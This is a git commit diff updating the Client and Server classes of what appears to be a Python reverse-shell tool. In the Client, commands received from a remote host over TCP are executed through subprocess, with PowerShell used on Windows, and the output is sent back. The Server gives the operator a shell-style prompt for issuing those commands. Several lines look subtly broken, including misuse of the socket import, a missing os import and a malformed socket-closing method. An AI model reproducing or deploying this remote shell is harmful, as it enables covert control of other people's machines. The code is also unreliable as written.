62aede038e82f9e4ae784bca93ef71d5f07b9cec
vandavey <56415208+davidvandewerker@users.noreply.github.com>
2020-05-16 12:01:53 -0600

    Update nodes.py
    Updated classes to minimum functionality

--- multi/nodes.py
+++ multi/nodes.py
@@ -1,6 +1,7 @@
 import getpass
 import subprocess
 import platform
+from socket import socket
 from multi.utils import *
 
 
@@ -8,10 +9,10 @@ class Client(object):
     def __init__(self, rhost: str, port: int = RandShort()):
         self.TargetAddr = rhost
         self.Port = port
-        self.Buffer = 1024
+        self.Buffer = 49152
 
     def connect(self) -> None:
-        socket.setdefaulttimeout(5)
+        #socket.setdefaulttimeout(5)
         sock = socket.socket()
 
         try:
@@ -31,22 +32,27 @@ class Client(object):
                 sock.send("Connection will now terminate".encode())
                 break
 
-            output = subprocess.getoutput(command)
+            if os.name == "nt":
+                output = subprocess.getoutput(f"powershell.exe {command}")
+            else:
+                output = subprocess.getoutput(command)
             sock.send(output.encode())
+
+        sock.close()
 
 
 class Server(object):
     def __init__(self, lhost: str = "0.0.0.0", port: int = RandShort()):
         self.HostAddr = lhost
         self.Port = port
-        self.Buffer = 1024
+        self.Buffer = 49152
 
     def get_info(self) -> str:
-        info = []
-        out = ""
+        info, out = [], ""
+        uname = [str(x) for x in platform.uname()]
 
-        for x, stat in enumerate(platform.uname()):
-            if x != 2:
+        for stat in uname:
+            if uname.index(stat) != 2:
                 info.append(stat)
 
         for item in info:
@@ -57,31 +63,52 @@ class Server(object):
 
         return out
 
+    def close_socket(self, client: socket, server: socket):
+        socket.socket(client).close()
+        socket.socket(server).close()
+
     def listen(self) -> None:
         server_sock = socket.socket()
+        client_sock = socket.socket()
         server_sock.bind((self.HostAddr, self.Port))
 
-        server_sock.listen(1)  # stay open for one connection
-        status(f"Listening for incoming TCP connection on port {self.Port}...")
+        try:
+            server_sock.listen(1)  # stay open for one connection
+            status(f"Listening for incoming TCP connection on port {self.Port}...")
 
-        client_sock, addr = server_sock.accept()
-        status(f"Received connection from {addr[0]} on port {addr[1]}.")
+            client_sock, addr = server_sock.accept()
+            status(f"Received connection from {addr[0]} on port {addr[1]}.")
+        except KeyboardInterrupt:
+            throw(f"User keyboard interrupt has been thrown.")
 
-        greeting = self.get_info()
-        client_sock.send(greeting.encode())
+        #greeting = self.get_info()
+        client_sock.send(f"Logged into {self.HostAddr}".encode())
+        user, host = getpass.getuser(), socket.gethostname()
 
         while True:
-            prompt = getpass.getuser() + "@" + platform.node()
+            try:
+                if os.name == "nt":
+                    prompt = f"RS {os.getcwd()}> "
+                else:
+                    prompt = f"{user}@{host}:{os.getcwd()}> "
 
-            command = input(f"{prompt}> ")
-            client_sock.send(command.encode())
+                command = input(f"{prompt}")
+                client_sock.send(command.encode())
 
-            if command.lower() in ["exit", "quit"]:
-                client_sock.send("Connection will now terminate".encode())
-                break
+                if command.lower() in ["exit", "quit"]:
+                    client_sock.send("Connection will now terminate".encode())
+                    break
 
-            cmd_results = client_sock.recv(self.Buffer).decode()
-            print(cmd_results)
+                cmd_results = client_sock.recv(self.Buffer).decode()
+                print(cmd_results)
+            except (ConnectionAbortedError, ConnectionResetError):
+                throw(f"Connection was ended by {self.HostAddr}", terminate=False)
+                self.close_socket(client_sock, server_sock)
+                throw()
+            except ConnectionRefusedError:
+                throw(f"Connection was refused by {self.HostAddr}", terminate=False)
+                self.close_socket(client_sock, server_sock)
+                throw()
 
         client_sock.close()
         server_sock.close()
